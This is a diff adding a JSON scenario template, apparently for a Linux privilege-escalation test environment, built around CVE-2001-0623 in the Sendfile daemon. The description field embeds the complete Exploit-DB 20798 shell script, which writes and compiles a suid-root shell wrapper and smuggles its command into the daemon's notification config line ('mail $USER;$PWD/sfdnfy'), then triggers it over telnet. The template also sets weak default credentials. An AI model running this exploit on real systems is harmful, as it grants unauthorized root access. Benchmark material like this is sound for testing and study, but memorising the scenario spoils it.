@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_20798",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Sendfile 1.x/2.1 - Forced Privilege Lowering Failure (CVE-2001-0623;OSVDB-13906)\n\nExploit source code (20798.sh):\n```\nsource: https://www.securityfocus.com/bid/2652/info\n\nSendfile is an implementation of the SAFT (simple asynchronous file transfer) protocol for UNIX systems.\n\nA serialization error exists in the Sendfile daemon, sendfiled. When used in conjunction with other problems found in the daemon, it may be possible for a local user to execute arbitrary commands as root and gain elevated privileges.\n\n#!/bin/sh\n#\n# sfdnfy - Sendfile daemon local arbitrary command execution vulnerability\n#\n# references:\n#   https://www.securityfocus.com/bid/2652\n#   https://www.securityfocus.com/bid/2631\n#\n# 04/24/01 psheep\n\nSFUSER=$USER\nSFHOST=localhost\nSFPORT=saft\nSFSPOOL=/var/spool/sendfile\nSFUSERCFG=\"$SFSPOOL/$SFUSER/config/config\"\n\necho \"Sendfile daemon local arbitrary command execution vulnerability\"\necho\necho \"  username        = $SFUSER\"\necho \"  spool directory = $SFSPOOL\"\necho \"  config file     = $SFUSERCFG\"\necho \"  target hostname = $SFHOST\"\necho \"  target port     = $SFPORT\"\necho\n\nif ! test -d $SFSPOOL; then\n  echo \"** unable to locate the sendfile spool directory, exiting\"\n  exit 1\nfi\n\nsfsavedcfg=\"no\"\n\nif ! test -d $SFSPOOL/$SFUSER || ! test -d $SFSPOOL/$SFUSER/config; then\n  echo \"** attempting to create sendfile spool directory for $SFUSER\"\n  echo\n  (sleep 1;echo \"TO $SFUSER\";sleep 2) | telnet $SFHOST $SFPORT\n  echo\nelse\n  if test -f $SFUSERCFG; then\n    echo \"** backing up your sendfile daemon configuration file\"\n    mv $SFUSERCFG $SFSPOOL/$SFUSER/config/config.tmp\n    sfsavedcfg=\"yes\"\n  fi\nfi\n\ncat > sfdnfy.c << EOF\n#include <unistd.h>\n#include <stdlib.h>\n\nint main() {\n    setreuid(0,0);\n    setgid(0);\n    system(\"chown root.root $PWD/sfdsh;chmod 4755 $PWD/sfdsh\");\n}\nEOF\n\ncat > sfdsh.c << EOF\n#include <unistd.h>\n\nint main() {\n    setreuid(0,0);\n    setgid(0);\n    execl(\"/bin/sh\", \"sh\", NULL);\n}\nEOF\n\necho \"** compiling helper application as $PWD/sfdnfy\"\ncc -o $PWD/sfdnfy $PWD/sfdnfy.c\n\nif ! test -x $PWD/sfdnfy; then\n  echo \"** compilation failed, exiting\"\n  exit 1\nfi\n\necho \"** compiling shell wrapper as $PWD/sfdsh\"\ncc -o $PWD/sfdsh $PWD/sfdsh.c\n\nif ! test -x $PWD/sfdsh; then\n  echo \"** compilation failed, exiting\"\n  exit 1\nfi\n\necho \"** inserting commands into temporary configuration file\"\necho \"notification = mail $USER;$PWD/sfdnfy\" >$SFUSERCFG\n\necho \"** attempting attack against sendfile daemon...\"\necho\n\n(sleep 1;cat << EOF\nFROM $USER\nTO $USER\nFILE boom$RANDOM\nSIZE 0 0\nDATA\nFILE boom$RANDOM\nSIZE 1 0\nDATA\nEOF\nsleep 2) | telnet $SFHOST $SFPORT\necho\n\nif test \"x$sfsavedcfg\" = xyes; then\n  echo \"** restoring backed up configuration file\"\n  mv $SFSPOOL/$SFUSER/config/config.tmp $SFUSERCFG\nelse\n  echo \"** removing temporary configuration file\"\n  rm $SFUSERCFG\nfi\n\necho \"** done, the shell wrapper should be suid root after the mailer is done\"\necho\nexit 1\n```",
+  "cve": "CVE-2001-0623;OSVDB-13906",
+  "exploitdb_id": "20798",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_20798",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
